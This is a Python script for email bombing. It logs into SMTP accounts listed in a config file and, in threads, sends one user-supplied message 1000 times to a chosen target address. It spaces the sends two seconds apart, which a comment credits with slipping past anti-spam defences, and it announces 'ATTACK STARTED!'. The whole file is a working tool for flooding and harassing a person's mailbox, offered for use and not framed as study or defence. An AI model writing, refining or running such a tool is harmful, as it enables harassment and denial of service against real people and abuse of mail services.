import smtplib
import time
import threading
import sys

from configparser import ConfigParser
from threading import Thread
from colorama import init, Fore
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def PrintError(message):
    print(f"[{Fore.RED}!{Fore.WHITE}] {message}")

def PrintMessage(message):
    print(f"[{Fore.YELLOW}#{Fore.WHITE}] {message}")

def StartServer(detailsSMTP, emailMessage):
    # Using details for login
    server = smtplib.SMTP(detailsSMTP[0])
    server.starttls()
    server.login(detailsSMTP[1], detailsSMTP[2])

    msg = MIMEMultipart()
    # <= 1000 messages - antispam defender
    for i in range(0, 1000):
        # Prepare message
        msg["Subject"] = emailMessage[0]
        msg.attach(MIMEText(emailMessage[1], "plain"))
        
        # Send message via SMTP
        try:
            server.sendmail(detailsSMTP[1], emailMessage[2], msg.as_string())
        except:
            PrintError("SMTP error: unknown error!")
        
        # Опытным путём выяснил: стоит делать паузу в 2 секунды
        time.sleep(2)
    
    # Освобождаем ресурсы
    server.quit()
    
def InitSMTP(configPath, emailMessage):
    # Try to open config file
    try:
        parser = ConfigParser()
        parser.read(configPath)
    except:
        PrintError("Parser error: file {configPath} not found/is broken!")
        return False
    
    threads = []
    detailsSMTP = [ "", "", "" ]

    # Get SMTP details from config
    for section in parser.sections():
        try:
            detailsSMTP[0] = parser.get(section, "SMTP")
            detailsSMTP[1] = parser.get(section, "MAIL_FROM")
            detailsSMTP[2] = parser.get(section, "MAIL_PASSWORD")
        except:
            PrintError("Parser error: incorrect details!")
            return False
        
        # Prepare threads
        PrintMessage(f"Current SMTP: {Fore.YELLOW}{detailsSMTP[0]}{Fore.WHITE}")
        try:
            threads.append(threading.Thread(target = StartServer, 
                args = (detailsSMTP, emailMessage, )))
        except:
            PrintError("SMTP error: unknown error!")
            return False
            
    return threads

def main():
    # Windows 10-11 color text fix
    init(autoreset = True)

    # Console arguments count
    argsLen = len(sys.argv)
    
    # Config path (ex: SMTP.ini)
    if argsLen > 1:
        configPath = str(sys.argv[1])
    else:
        configPath = "SMTP.ini"

    # E-mail message details (title, text, target)
    emailMessage = [ "", "", "" ]
        
    # Заголовок сообщения
    if argsLen > 2:
        emailMessage[0] = str(sys.argv[2])
    else:
        PrintMessage("Enter a e-mail title: ")
        emailMessage[0] = input()
    
    # Исходный текст сообщения
    if argsLen > 3:
        emailMessage[1] = str(sys.argv[3])
    else:
        PrintMessage("Enter a message: ")
        emailMessage[1] = input()
        
    if argsLen > 4:
        emailMessage[2] = str(sys.argv[4])
    else:
        # Regex not needed
        # (https://davidcel.is/posts/stop-validating-email-addresses-with-regex/)
        PrintMessage("Enter a target e-mail: ")
        emailMessage[2] = input()
    
    # Prepare threads array
    PrintMessage("Loading a SMTP servers...")
    threads = InitSMTP(configPath, emailMessage)
    if threads == False or len(threads) <= 0:
        PrintError("Can't find any working SMTP server")
        return
    
    # Run and sync threads
    PrintMessage(f"{Fore.GREEN}ATTACK STARTED!{Fore.WHITE}")
    for it in threads:
        it.start()
        it.join()

if __name__ == "__main__":
    main()
